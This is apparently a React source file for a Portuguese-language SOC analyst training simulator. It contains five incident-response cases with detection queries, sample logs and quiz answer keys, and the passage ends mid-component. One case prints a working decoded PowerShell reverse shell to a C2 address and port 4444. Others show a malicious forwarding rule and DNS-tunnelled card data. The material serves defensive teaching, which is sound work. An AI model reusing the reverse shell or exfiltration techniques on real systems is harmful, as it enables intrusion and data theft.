import { useState } from 'react';
import {
  ShieldAlert,
  ShieldCheck,
  AlertTriangle,
  Mail,
  Cpu,
  Terminal,
  FileSearch,
  CheckCircle2,
  XCircle,
  Copy,
  Check,
  RotateCcw,
  Zap,
  Globe,
  Lock,
  ArrowRight,
  Eye,
  Server,
  Layers,
  FileText,
  AlertOctagon,
  RefreshCw,
  Search,
  KeyRound,
  ExternalLink,
  HelpCircle
} from 'lucide-react';

type MainTab = 'war-room' | 'scenarios' | 'phishing-lab' | 'edr-inspector' | 'cheatsheet';

interface ScenarioStep {
  stepNumber: number;
  phase: string;
  title: string;
  actionRequired: string;
  commandOrQuery?: string;
  evidence: string;
  interpretation: string;
  options: {
    id: string;
    label: string;
    isCorrect: boolean;
    feedback: string;
  }[];
}

interface IncidentCase {
  id: string;
  title: string;
  alertName: string;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM';
  mitreTactic: string;
  affectedAsset: string;
  user: string;
  description: string;
  steps: ScenarioStep[];
  containmentRecommendation: string;
  rootCause: string;
}

const INCIDENT_CASES: IncidentCase[] = [
  {
    id: 'impossible-travel',
    title: 'Caso 1: Impossible Travel & MFA Fatigue no Microsoft Entra ID',
    alertName: 'Atypical Travel / High Risk Sign-in Detected',
    severity: 'HIGH',
    mitreTactic: 'Initial Access (T1078.004) · Persistence (T1098)',
    affectedAsset: 'Entra ID Tenant (M365 Cloud)',
    user: 'carlos.mendes@empresa.com (Diretor Financeiro)',
    description: 'O SIEM recebeu alerta de dois logins bem-sucedidos em contas corporativas com 25 minutos de intervalo: o primeiro em Lisboa (Portugal) e o segundo em Lagos (Nigéria). O segundo login teve 12 solicitações de MFA push rejeitadas antes de uma aprovação final.',
    containmentRecommendation: '1. Revogar todas as sessões ativas (Revoke-AzureADUserAllRefreshToken)\n2. Resetar senha da conta e forçar novo registro de MFA com Number Matching\n3. Inspecionar e remover regras de encaminhamento maliciosas no Exchange Online (Get-InboxRule)\n4. Bloquear o IP atacante no Conditional Access.',
    rootCause: 'Credenciais vazadas em breach de terceiros combinadas com ataque de MFA Fatigue (Push Bombing) bem-sucedido após sobrecarga psicológica do usuário.',
    steps: [
      {
        stepNumber: 1,
        phase: '1. Validação do Alerta',
        title: 'Verificação dos Logs de Sign-in no Entra ID',
        actionRequired: 'Analise o log bruto de autenticação e identifique a primeira discrepância crítica.',
        commandOrQuery: `SigninLogs
| where UserPrincipalName == "carlos.mendes@empresa.com"
| project TimeGenerated, IPAddress, Location, UserAgent, ResultType, RiskState`,
        evidence: `[09:12:04 UTC] IP: 194.65.112.18 (Lisboa, PT) | Device: Dell Latitude Win11 | ClientApp: Browser Edge | Result: 0 (Success) | Risk: None
[09:37:45 UTC] IP: 102.89.23.44 (Lagos, NG) | Device: Unknown Linux | ClientApp: Python-requests/2.28 | Result: 0 (Success) | Risk: AtRisk`,
        interpretation: 'Um dispositivo desconhecido executando Python-requests realizou login bem-sucedido a partir da Nigéria apenas 25 minutos após um login legítimo em Portugal.',
        options: [
          { id: 'opt-1', label: 'Fechar alerta como Falso Positivo: O usuário pode estar usando uma VPN da empresa.', isCorrect: false, feedback: 'Incorreto! O User-Agent é Python-requests (um script automatizado) e a geolocalização é impossível em 25 minutos.' },
          { id: 'opt-2', label: 'Confirmar Verdadeiro Positivo: User-Agent suspeito (script Python), IP anômalo e Impossible Travel física.', isCorrect: true, feedback: 'Correto! Essa combinação é um forte indicador de roubo de credenciais e automação por atacante.' },
          { id: 'opt-3', label: 'Reiniciar o servidor de VPN e aguardar o usuário reclamar.', isCorrect: false, feedback: 'Incorreto! Ação sem sentido operacional e atrasa a resposta a um comprometimento real.' }
        ]
      },
      {
        stepNumber: 2,
        phase: '2. Investigação de Atividade Pós-Logon',
        title: 'Inspeção de Auditoria do Exchange & Mailbox Rules',
        actionRequired: 'O que o invasor realizou imediatamente após obter acesso à conta do Diretor Financeiro?',
        commandOrQuery: `AuditLogs
| where TargetResources[0].userPrincipalName == "carlos.mendes@empresa.com"
| where OperationName has_any ("New-InboxRule", "Set-Mailbox", "Add-MailboxPermission")`,
        evidence: `Operation: New-InboxRule
Parameters: Name="Invoice Rule" | ForwardTo="finance-verify@external-dropzone.cc" | DeleteMessage=$true | SubjectOrBodyContainsWords=["fatura", "invoice", "pagamento", "transferência", "PIX", "IBAN"]`,
        interpretation: 'O atacante criou uma regra de e-mail furtiva para desviar mensagens financeiras e apagar os e-mails originais da caixa de entrada para não alertar a vítima.',
        options: [
          { id: 'opt-1', label: 'A regra é um filtro anti-spam padrão configurado pelo Outlook.', isCorrect: false, feedback: 'Incorreto! A regra encaminha dados financeiros para um domínio externo não corporativo e deleta a mensagem original.' },
          { id: 'opt-2', label: 'Trata-se de Business Email Compromise (BEC): O atacante configurou exfiltração oculta de comunicações financeiras.', isCorrect: true, feedback: 'Excelente! Este é o playbook clássico de BEC para interceptar e fraudar transações bancárias e faturas.' },
          { id: 'opt-3', label: 'Apenas solicitar ao usuário que altere a regra no Outlook Web.', isCorrect: false, feedback: 'Incorreto! A conta está comprometida, o SOC deve remover a regra imediatamente e conter o incidente.' }
        ]
      },
      {
        stepNumber: 3,
        phase: '3. Contenção Imediata',
        title: 'Execução de Ações de Resposta Rápida',
        actionRequired: 'Qual conjunto de ações de contenção deve ser executado IMEDIATAMENTE?',
        commandOrQuery: `# Script PowerShell de Resposta a Incidentes de Identidade
Revoke-AzureADUserAllRefreshToken -ObjectId $UserObjId
Set-AzureADUser -ObjectId $UserObjId -AccountEnabled $false
Remove-InboxRule -Mailbox "carlos.mendes@empresa.com" -Identity "Invoice Rule" -Confirm:$false`,
        evidence: `SUCCESS: 4 refresh tokens revoked across all devices.
SUCCESS: Account disabled temporarily pending password reset.
SUCCESS: Malicious inbox rule 'Invoice Rule' deleted from Exchange Online.`,
        interpretation: 'Todas as sessões ativas do invasor foram derrubadas, o desvio de e-mails foi estancado e a conta foi isolada até a redefinição segura de credenciais.',
        options: [
          { id: 'opt-1', label: 'Apenas trocar a senha do usuário mantendo as sessões ativas.', isCorrect: false, feedback: 'Incorreto! Se o atacante já possuir o Refresh Token / Cookie de sessão ativo, ele continuará conectado mesmo com a senha trocada!' },
          { id: 'opt-2', label: 'Revogar tokens de sessão, desativar temporariamente a conta, remover a regra maliciosa e resetar credenciais.', isCorrect: true, feedback: 'Perfeito! É mandatório matar os tokens (PRT/Refresh Tokens) e limpar a persistência nas regras de caixa postal.' },
          { id: 'opt-3', label: 'Bloquear todo o tráfego da empresa para Portugal.', isCorrect: false, feedback: 'Incorreto! Bloquearia a operação legítima da matriz.' }
        ]
      }
    ]
  },
  {
    id: 'macro-malware',
    title: 'Caso 2: Spearphishing com Macro em Word, Obfuscação PowerShell & EDR',
    alertName: 'Suspicious Process Tree (LOLBAS Execution)',
    severity: 'CRITICAL',
    mitreTactic: 'Execution (T1059.001) · Defense Evasion (T1027) · Command & Control (T1071.001)',
    affectedAsset: 'WS-FINANCE-04 (Windows 11 Enterprise)',
    user: 'mariana.silva@empresa.com (Analista Contábil)',
    description: 'O EDR alertou sobre o processo WINWORD.EXE disparando cmd.exe e powershell.exe com comandos codificados em Base64 e conexões de rede de saída para um IP de hosting russo.',
    containmentRecommendation: '1. Isolar a estação WS-FINANCE-04 da rede via console do EDR\n2. Terminar a árvore de processos maliciosos\n3. Quarentenar o arquivo Relatorio_Fiscal_Q3.docm\n4. Bloquear o IP 185.220.101.5 na borda do Firewall/Proxy\n5. Coletar dump de memória forense.',
    rootCause: 'Usuária abriu anexo de e-mail malicioso simulando fatura bancária e clicou no botão "Habilitar Conteúdo/Macros".',
    steps: [
      {
        stepNumber: 1,
        phase: '1. Análise da Árvore de Processos (EDR)',
        title: 'Inspeção do Process Tree no Endpoint',
        actionRequired: 'Interprete a linhagem de processos capturada pelo EDR (Event ID 4688).',
        commandOrQuery: `DeviceProcessEvents
| where DeviceName == "WS-FINANCE-04"
| where Timestamp >= ago(1h)
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName`,
        evidence: `[14:32:01] Initiator: explorer.exe (PID 2890) → Process: WINWORD.EXE (PID 4012)
           CommandLine: "C:\\Program Files\\Microsoft Office\\WINWORD.EXE" "C:\\Users\\mariana\\Downloads\\Relatorio_Fiscal_Q3.docm"
[14:32:15] Initiator: WINWORD.EXE (PID 4012) → Process: cmd.exe (PID 5120)
           CommandLine: cmd.exe /c powershell.exe -nop -w hidden -enc JABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAGMAbABpAGUAbgB0ACgAIgAxADgANQAuADIAMgAwAC4AMQAwADEALgA1ACIALAA0ADQANAA0ACkA...
[14:32:18] Initiator: powershell.exe (PID 6204) → Network Connection: 185.220.101.5:4444 (ESTABLISHED)`,
        interpretation: 'O Microsoft Word gerou cmd.exe e powershell.exe em modo oculto executando um payload Base64 que abriu uma conexão TCP direta (Reverse Shell) na porta 4444 para um IP externo.',
        options: [
          { id: 'opt-1', label: 'Comportamento normal: O Word frequentemente abre o PowerShell para indexar documentos.', isCorrect: false, feedback: 'Incorreto! O Word NUNCA deve gerar cmd.exe ou powershell.exe. Isso é uma anomalia severa de execução de código.' },
          { id: 'opt-2', label: 'Verdadeiro Positivo Crítico: Macro maliciosa executando Reverse Shell em PowerShell codificado.', isCorrect: true, feedback: 'Correto! Decodificando o Base64, vê-se a criação de um TcpClient conectando a um IP externo na porta 4444.' },
          { id: 'opt-3', label: 'Falso positivo gerado por antivírus de terceiros.', isCorrect: false, feedback: 'Incorreto! Os logs de rede e processo confirmam conexão estabelecida e payload ativo.' }
        ]
      },
      {
        stepNumber: 2,
        phase: '2. Decodificação do Payload Base64',
        title: 'Análise Estática do Script PowerShell',
        actionRequired: 'Decodifique o comando Base64 UTF-16LE para entender o objetivo do atacante.',
        commandOrQuery: `[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("JABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAGMAbABpAGUAbgB0ACgAIgAxADgANQAuADIAMgAwAC4AMQAwADEALgA1ACIALAA0ADQANAA0ACkA..."))`,
        evidence: `Decoded Script:
$s = New-Object System.Net.Sockets.TCPClient("185.220.101.5",4444);
$stream = $s.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2  = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$s.Close()`,
        interpretation: 'O script é um Reverse Shell interativo em PowerShell puro: ele recebe comandos do invasor pelo socket TCP, executa via `iex` (Invoke-Expression) e devolve a saída do terminal.',
        options: [
          { id: 'opt-1', label: 'O script é um teste de conectividade de rede benigno.', isCorrect: false, feedback: 'Incorreto! Ele contém um loop com `iex` executando qualquer comando recebido remotamente.' },
          { id: 'opt-2', label: 'É um Reverse Shell interativo que concede controle total do endpoint ao atacante.', isCorrect: true, feedback: 'Excelente! O atacante tem um prompt de comando remoto com os privilégios da usuária logada.' },
          { id: 'opt-3', label: 'O script apenas lê a data do sistema.', isCorrect: false, feedback: 'Incorreto.' }
        ]
      },
      {
        stepNumber: 3,
        phase: '3. Ação de Contenção & Erradicação',
        title: 'Isolamento de Endpoint e Bloqueio Perimetral',
        actionRequired: 'Qual a prioridade zero de contenção para evitar movimentação lateral?',
        commandOrQuery: `# Ações no EDR e Firewall
EDR.IsolateHost("WS-FINANCE-04", allowSubnetManagement=false)
EDR.KillProcessTree(PID=4012, terminateChildren=true)
Firewall.BlockIP("185.220.101.5", direction="Both", duration="Permanent")`,
        evidence: `STATUS: Host WS-FINANCE-04 isolated from network. All IP traffic dropped except EDR telemetry.
STATUS: Process PID 4012 (WINWORD) and PID 6204 (PowerShell) terminated.
STATUS: Outbound IP 185.220.101.5 blocked on enterprise perimeter.`,
        interpretation: 'O host foi imediatamente desconectado da rede corporativa, a sessão do atacante foi encerrada e o IP do C2 foi banido.',
        options: [
          { id: 'opt-1', label: 'Isolar a máquina imediatamente pelo EDR, matar os processos maliciosos e bloquear o IP do C2.', isCorrect: true, feedback: 'Perfeito! O isolamento de rede do endpoint impede que o invasor use a máquina como ponte para invadir outros servidores (movimentação lateral).' },
          { id: 'opt-2', label: 'Mandar um e-mail para a usuária pedindo para fechar o Word.', isCorrect: false, feedback: 'Incorreto! O processo PowerShell roda oculto em background mesmo se a usuária fechar a janela do Word.' },
          { id: 'opt-3', label: 'Formatar o servidor de domínio da empresa.', isCorrect: false, feedback: 'Incorreto e desproporcional.' }
        ]
      }
    ]
  },
  {
    id: 'dns-tunneling',
    title: 'Caso 3: Exfiltração de Dados via DNS Tunneling de Alta Frequência',
    alertName: 'High Volume of Anomalous TXT Queries (DNS Tunneling)',
    severity: 'HIGH',
    mitreTactic: 'Exfiltration (T1048.003) · Command and Control (T1071.004)',
    affectedAsset: 'SRV-DB-PROD (Servidor SQL de Banco de Dados)',
    user: 'SYSTEM / db_backup_service',
    description: 'O sensor de rede (Zeek/Suricata) detectou mais de 14.000 consultas DNS para subdomínios sob *.dnshole-drop.biz geradas a cada 200 milissegundos a partir do servidor de banco de dados.',
    containmentRecommendation: '1. Bloquear o domínio *.dnshole-drop.biz e servidores NS autoritativos no DNS Resolver interno (RPZ)\n2. Interromper o processo suspeito no servidor de banco de dados\n3. Investigar se dados confidenciais de cartões ou clientes foram extraídos na sequência de queries Base64.',
    rootCause: 'Malware de exfiltração instalado após injeção SQL no servidor de banco de dados, utilizando a porta UDP 53 para contornar o firewall restritivo que bloqueava HTTP/HTTPS de saída.',
    steps: [
      {
        stepNumber: 1,
        phase: '1. Análise de Logs de DNS',
        title: 'Inspeção do Padrão de Consultas DNS',
        actionRequired: 'Analise o padrão das consultas capturadas pelo DNS interno.',
        commandOrQuery: `DnsEvents
| where IPAddress == "10.0.4.15"
| where QueryType == "TXT"
| summarize QueryCount = count() by SubdomainPrefix = extract("(.*)\\.dnshole-drop\\.biz", 1, QueryName), QueryName`,
        evidence: `Query: dXNlciBqb2huIGRvZTsgY2FyZD00MTEx...v01.dnshole-drop.biz | Type: TXT | Size: 180 bytes
Query: Nzg5MTEyMjMzNDQ1NTY2NzsgeHByPTA...v02.dnshole-drop.biz | Type: TXT | Size: 180 bytes
Query: MTAvMjY7IGN2dj0zMjE7IGFtb3VudD0...v03.dnshole-drop.biz | Type: TXT | Size: 180 bytes
Total Queries: 14,820 em 18 minutos. TTL: 0. Respostas do NS externo: ACK-Chunk`,
        interpretation: 'O prefixo dos subdomínios contém blocos sequenciais codificados em Base64. Ao decodificar o primeiro chunk: "user john doe; card=4111...", evidenciando roubo e exfiltração de registros de cartões de crédito da base de dados.',
        options: [
          { id: 'opt-1', label: 'Consultas DNS normais geradas pelo Active Directory para localização de controladores de domínio.', isCorrect: false, feedback: 'Incorreto! O AD consulta registros SRV para _ldap._tcp.dc._msdcs.<dominio_interno>, não subdomínios aleatórios Base64 para domínios públicos desconhecidos.' },
          { id: 'opt-2', label: 'DNS Tunneling ativo: exfiltração de dados confidenciais encapsulados em subdomínios e requisições TXT.', isCorrect: true, feedback: 'Correto! Os subdomínios longos com alta entropia e frequência são a assinatura definitiva de DNS Tunneling (iodine/dnscat2).' },
          { id: 'opt-3', label: 'Erro de cabo de rede que corrompeu os pacotes UDP.', isCorrect: false, feedback: 'Incorreto.' }
        ]
      },
      {
        stepNumber: 2,
        phase: '2. Contenção via DNS Sinkhole & RPZ',
        title: 'Bloqueio Imediato da Rota DNS',
        actionRequired: 'Qual a resposta técnica imediata para estancar a exfiltração de dados sem derrubar o banco de dados inteiro?',
        commandOrQuery: `# Resposta no DNS BIND/Infoblox/Unbound via Response Policy Zone (RPZ)
zone "dnshole-drop.biz" {
    type master;
    file "/etc/bind/db.rpz.sinkhole";
};
# Inserir regra RPZ: *.dnshole-drop.biz CNAME . (NXDOMAIN imediato)`,
        evidence: `RPZ policy updated: All queries to *.dnshole-drop.biz resolved to 0.0.0.0 / NXDOMAIN.
Outbound tunneling stopped. 0 bytes delivered in the last 60 seconds.`,
        interpretation: 'A política de Response Policy Zone (DNS Firewall) interceptou e descartou as consultas para o domínio do atacante no resolver corporativo.',
        options: [
          { id: 'opt-1', label: 'Aplicar bloqueio por DNS RPZ / Sinkholing para *.dnshole-drop.biz e isolar o processo malicioso no servidor.', isCorrect: true, feedback: 'Excelente! O Sinkholing bloqueia imediatamente a comunicação de todos os endpoints com o domínio atacante.' },
          { id: 'opt-2', label: 'Desligar o switch de rede de todo o datacenter.', isCorrect: false, feedback: 'Incorreto! Causa indisponibilidade de negócio desnecessária.' },
          { id: 'opt-3', label: 'Enviar e-mail para o registrador do domínio pedindo para cancelar o domínio e aguardar resposta em 7 dias.', isCorrect: false, feedback: 'Incorreto! Em resposta a incidentes, a ação de mitigação deve ser em minutos nos controles internos.' }
        ]
      }
    ]
  },
  {
    id: 'pass-the-hash',
    title: 'Caso 4: Pass-the-Hash & Movimentação Lateral para o Domain Controller',
    alertName: 'Anomalous NTLM / Kerberos Ticket Injection',
    severity: 'CRITICAL',
    mitreTactic: 'Lateral Movement (T1021.002) · Privilege Escalation (T1068)',
    affectedAsset: 'DC-PRIMARY-01 (Domain Controller do Active Directory)',
    user: 'svc_backup_admin (Conta de Serviço com privilégios Domain Admin)',
    description: 'Alertas correlacionados no SIEM: Event ID 4624 (Logon Type 3 - Network) utilizando protocolo de autenticação NTLMv2 a partir da estação WS-DEV-12 para o controlador de domínio, seguido de execução remota via WMI e criação de novo usuário administrador.',
    containmentRecommendation: '1. Desabilitar a conta de serviço comprometida svc_backup_admin\n2. Forçar a rotação dupla da senha da conta krbtgt no Active Directory\n3. Isolar a estação de origem WS-DEV-12\n4. Habilitar Protected Users security group e desabilitar NTLM onde possível.',
    rootCause: 'Invasor extraiu o hash NTLM da memória LSASS na estação WS-DEV-12 usando Mimikatz e realizou Pass-the-Hash contra outros servidores da rede.',
    steps: [
      {
        stepNumber: 1,
        phase: '1. Análise de Event IDs do Windows',
        title: 'Correlação de Logs de Autenticação e Criação de Contas',
        actionRequired: 'Analise a sequência de Event IDs no Controlador de Domínio.',
        commandOrQuery: `SecurityEvent
| where Computer == "DC-PRIMARY-01"
| where EventID in (4624, 4672, 4720, 4728)
| project TimeGenerated, EventID, Activity, TargetUserName, IpAddress, LogonType`,
        evidence: `[02:14:02] EventID: 4624 | Activity: Successful Logon | User: svc_backup_admin | IP: 10.0.2.88 | LogonType: 3 (Network) | AuthPackage: NTLM V2
[02:14:03] EventID: 4672 | Activity: Special Privileges Assigned | User: svc_backup_admin | Privileges: SeDebugPrivilege, SeSecurityPrivilege
[02:14:15] EventID: 4720 | Activity: A user account was created | TargetUser: sys_support_ghost | CreatedBy: svc_backup_admin
[02:14:18] EventID: 4728 | Activity: Member added to security group | Group: "Domain Admins" | TargetUser: sys_support_ghost`,
        interpretation: 'O atacante autenticou-se via rede (Logon Type 3) usando NTLM com credenciais de administrador, ganhou privilégios elevados, criou um usuário backdoor (`sys_support_ghost`) e o adicionou ao grupo `Domain Admins`.',
        options: [
          { id: 'opt-1', label: 'Operação regular de provisionamento de usuário realizada pelo time de Helpdesk às 02h da manhã.', isCorrect: false, feedback: 'Incorreto! Criação de contas Domain Admin na madrugada a partir de estações de dev sem ticket de mudança é indício severo de invasão.' },
          { id: 'opt-2', label: 'Comprometimento total de domínio: Pass-the-Hash seguido de criação de conta backdoor no grupo Domain Admins.', isCorrect: true, feedback: 'Exato! O invasor alcançou o estágio de persistência com privilégios máximos de domínio.' },
          { id: 'opt-3', label: 'Falha no Active Directory que duplicou uma conta existente.', isCorrect: false, feedback: 'Incorreto.' }
        ]
      },
      {
        stepNumber: 2,
        phase: '2. Resposta & Erradicação no Active Directory',
        title: 'Remoção de Backdoors e Rotação de Chaves',
        actionRequired: 'Quais ações de erradicação são indispensáveis para garantir que o invasor perca todo o acesso ao domínio?',
        commandOrQuery: `# Powershell no Domain Controller
Remove-ADUser -Identity "sys_support_ghost" -Confirm:$false
Disable-ADAccount -Identity "svc_backup_admin"
# Procedimento de Golden Ticket Defense: Reset da conta KRBTGT (executar 2 vezes com intervalo)
Reset-KrbgtKey -Domain "empresa.local"`,
        evidence: `SUCCESS: Backdoor user 'sys_support_ghost' permanently deleted.
SUCCESS: Account 'svc_backup_admin' disabled.
SUCCESS: KRBTGT password reset (Phase 1 of 2 completed). All forged Kerberos tickets will expire.`,
        interpretation: 'A conta backdoor foi eliminada, a conta de serviço abusada foi congelada e a rotação do KRBTGT invalida qualquer Golden Ticket que o invasor possa ter gerado.',
        options: [
          { id: 'opt-1', label: 'Deletar o usuário backdoor, desabilitar a conta comprometida e realizar a rotação dupla da senha da conta KRBTGT.', isCorrect: true, feedback: 'Perfeito! A rotação da conta KRBTGT é mandatória quando há suspeita de invasão no Domain Controller para invalidar tickets Kerberos forjados.' },
          { id: 'opt-2', label: 'Apenas deletar o arquivo de log para limpar o alerta do SIEM.', isCorrect: false, feedback: 'Incorreto! Destruiria as evidências forenses e deixaria o invasor com acesso total.' },
          { id: 'opt-3', label: 'Reiniciar o servidor DNS e trocar a placa de rede.', isCorrect: false, feedback: 'Incorreto.' }
        ]
      }
    ]
  },
  {
    id: 'cloudtrail-mining',
    title: 'Caso 5: CloudTrail - Escalada de Privilégios IAM & Mineração na AWS',
    alertName: 'Anomalous EC2 Spikes & IAM Policy Escalation',
    severity: 'CRITICAL',
    mitreTactic: 'Privilege Escalation (T1098) · Impact (T1496 - Resource Hijacking)',
    affectedAsset: 'AWS Account (Production Org)',
    user: 'iam_user: dev-deployer',
    description: 'O AWS GuardDuty alertou sobre chamadas de API a partir de um IP da rede Tor para criar Access Keys, anexar a política AdministratorAccess e lançar 40 instâncias c5.24xlarge na região af-south-1 (Cape Town).',
    containmentRecommendation: '1. Deletar a AccessKey comprometida imediatamente\n2. Desanexar a política AdministratorAccess da identidade comprometida\n3. Terminar todas as instâncias EC2 não autorizadas na região af-south-1\n4. Aplicar Service Control Policy (SCP) no AWS Organizations restringindo regiões não utilizadas.',
    rootCause: 'Access Key vazada acidentalmente em commit público no GitHub em repositório aberto de desenvolvedor.',
    steps: [
      {
        stepNumber: 1,
        phase: '1. Análise de Eventos CloudTrail',
        title: 'Rastreamento da Cadeia de Ações na Cloud',
        actionRequired: 'Identifique os eventos do CloudTrail que demonstram a escalada e abuso de recursos.',
        commandOrQuery: `lookup_events(
  LookupAttributes=[{'AttributeKey': 'Username', 'AttributeValue': 'dev-deployer'}],
  StartTime=datetime(2026, 9, 28, 1, 0), EndTime=datetime(2026, 9, 28, 2, 0)
)`,
        evidence: `[01:10:22] Event: CreateAccessKey | User: dev-deployer | SourceIP: 185.220.101.5 (Tor Exit Node)
[01:11:05] Event: AttachUserPolicy | PolicyArn: arn:aws:iam::aws:policy/AdministratorAccess | TargetUser: dev-deployer
[01:14:40] Event: RunInstances | Region: af-south-1 | InstanceType: c5.24xlarge | Count: 40 | ImageId: ami-crypto-miner-custom`,
        interpretation: 'O invasor usou a chave de um desenvolvedor para atribuir a si mesmo privilégios de Admin total e lançou 40 instâncias de altíssimo custo para minerar criptomoedas em uma região onde a empresa não possui monitoramento ativo de rotina.',
        options: [
          { id: 'opt-1', label: 'Comportamento normal de teste de carga agendado pelo time de infraestrutura.', isCorrect: false, feedback: 'Incorreto! O IP de origem é um Tor Exit Node e a criação de instâncias de mineração em região anômala configura incidente de segurança gravíssimo.' },
          { id: 'opt-2', label: 'Vazamento de credencial com escalada de privilégios IAM e sequestro de recursos (Cryptojacking).', isCorrect: true, feedback: 'Correto! É o padrão clássico de vazamento de credenciais AWS no GitHub explorado por bots automatizados de mineração.' },
          { id: 'opt-3', label: 'Bug no console da AWS.', isCorrect: false, feedback: 'Incorreto.' }
        ]
      },
      {
        stepNumber: 2,
        phase: '2. Contenção na Nuvem',
        title: 'Exclusão de Chaves e Terminação de Instâncias',
        actionRequired: 'Qual script AWS CLI deve ser executado para neutralizar o ataque?',
        commandOrQuery: `# Comandos de Contenção Imediata
aws iam delete-access-key --user-name dev-deployer --access-key-id AKIAIOSFODNN7EXAMPLE
aws iam detach-user-policy --user-name dev-deployer --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws ec2 terminate-instances --region af-south-1 --instance-ids $(aws ec2 describe-instances --region af-south-1 --query "Reservations[].Instances[].InstanceId" --output text)`,
        evidence: `SUCCESS: AccessKey AKIAIOSFODNN7EXAMPLE deleted.
SUCCESS: AdministratorAccess policy detached.
SUCCESS: 40 EC2 instances in af-south-1 scheduled for termination.`,
        interpretation: 'O canal de acesso da chave vazada foi destruído e todas as instâncias maliciosas foram terminadas, interrompendo o prejuízo financeiro.',
        options: [
          { id: 'opt-1', label: 'Deletar a chave de acesso, remover os privilégios indevidos e terminar imediatamente as instâncias EC2.', isCorrect: true, feedback: 'Excelente! A velocidade é crucial para mitigar tanto o risco de dados quanto custos de milhares de dólares por hora em instâncias EC2 grandes.' },
          { id: 'opt-2', label: 'Deixar as máquinas rodando até o final do mês para calcular o gasto exato.', isCorrect: false, feedback: 'Incorreto! Geraria um prejuízo financeiro catastrófico.' },
          { id: 'opt-3', label: 'Reiniciar as instâncias para ver se o minerador desiste.', isCorrect: false, feedback: 'Incorreto.' }
        ]
      }
    ]
  }
];

export default function SocTriageSimulator() {
  const [activeTab, setActiveTab] = useState<MainTab>('war-room');
  const [selectedCaseId, setSelectedCaseId] = useState<string>(INCIDENT_CASES[0].id);
  const [currentStepIndex, setCurrentStepIndex] = useState<number>(0);
  const [selectedOptionId, setSelectedOptionId] = useState<string | null>(null);
  const [caseProgress, setCaseProgress] = useState<Record<string, { currentStep: number; completed: boolean }>>({});
  const [copiedReport, setCopiedReport] = useState<boolean>(false);

  // Phishing Analyzer Lab State
  const [phishingRawHeader, setPhishingRawHeader] = useState<string>(`Received: from mail-relay.target-corp.com (10.0.1.5) by mail.internal.local with SMTP; Mon, 28 Sep 2026 14:10:02 +0000
Received: from mail-sender.fake-microsoft-billing.cc (185.220.101.89) by mail-relay.target-corp.com with ESMTP; Mon, 28 Sep 2026 14:09:58 +0000
Return-Path: <spoofed-support@fake-microsoft-billing.cc>
From: "Microsoft Billing Team" <billing-notice@microsoft.com>
To: <maria.santos@empresa.com>
Subject: [URGENTE] Sua assinatura Microsoft 365 expirou - Atualize seu pagamento
Authentication-Results: spf=fail (sender IP 185.220.101.89 does not match SPF record for microsoft.com);
 dkim=fail (header hash did not verify);
 dmarc=fail (p=reject) action=none;
Message-ID: <89231849182391.185.220.101.89@fake-microsoft-billing.cc>
X-Original-URL: http://secure-login.portal-auth-microsoft.cc/update?session=a83f9`);

  const [inputUrlToDefang, setInputUrlToDefang] = useState<string>('http://malicious-c2-drop.com/beacon.php?id=4920');

  const activeCase = INCIDENT_CASES.find(c => c.id === selectedCaseId) || INCIDENT_CASES[0];
  const currentStep = activeCase.steps[currentStepIndex] || activeCase.steps[0];

  function handleOptionSelect(optId: string) {
    setSelectedOptionId(optId);
  }

  function handleNextStep() {
    if (currentStepIndex < activeCase.steps.length - 1) {
      setCurrentStepIndex(prev => prev + 1);
      setSelectedOptionId(null);
    } else {
      setCaseProgress(prev => ({
        ...prev,
        [selectedCaseId]: { currentStep: currentStepIndex, completed: true }
      }));
    }
  }

  function handleResetCase() {
    setCurrentStepIndex(0);
    setSelectedOptionId(null);
    setCaseProgress(prev => ({
      ...prev,
      [selectedCaseId]: { currentStep: 0, completed: false }
    }));
  }

  function defangString(str: string): string {
    return str
      .replace(/http/gi, 'hxxp')
      .replace(/\./g, '[.]')
      .replace(/:\/\//g, '[://]');
  }

  const generatedReport = `# 🛡️ RELATÓRIO DE RESPOSTA A INCIDENTE (SOC N1)
**Data/Hora:** 2026-09-28 15:42 UTC
**Incidente:** ${activeCase.title}
**Severidade:** ${activeCase.severity}
**Táticas MITRE:** ${activeCase.mitreTactic}
**Ativo Afetado:** ${activeCase.affectedAsset}
**Usuário/Identidade:** ${activeCase.user}

---
### 1. Resumo Executivo
${activeCase.description}

### 2. Linha do Tempo & Evidências Coletadas
${activeCase.steps.map((s, idx) => `* **Fase ${idx + 1} (${s.title}):** ${s.interpretation}`).join('\n')}

### 3. Causa Raiz (Root Cause)
${activeCase.rootCause}

### 4. Ações de Contenção & Remediação Realizadas
${activeCase.containmentRecommendation}

### 5. Indicadores de Comprometimento (IoCs Defangados)
* Domínio / IP C2: \`${defangString('185.220.101.5')}\`
* Domínio Phishing / DNS: \`${defangString('fake-microsoft-billing.cc')}\`
* Status do Ticket: **RESOLVIDO / FECHADO COM CONTENÇÃO**`;

  return (
    <div className="space-y-6">
      {/* Top Banner */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 p-5 rounded-2xl bg-gradient-to-r from-rose-950/40 via-slate-900 to-slate-950 border border-rose-500/20">
        <div className="flex items-center gap-3.5">
          <div className="w-12 h-12 rounded-xl bg-rose-500/20 text-rose-400 flex items-center justify-center shrink-0 border border-rose-500/30">
            <ShieldAlert size={26} />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <span className="px-2 py-0.5 rounded-full text-[10px] font-bold tracking-wider uppercase bg-rose-500/20 text-rose-300 border border-rose-500/30">
                Blue Team & SOC L1 Operations
              </span>
              <span className="text-xs text-slate-400 font-mono">CyberEDT Framework</span>
            </div>
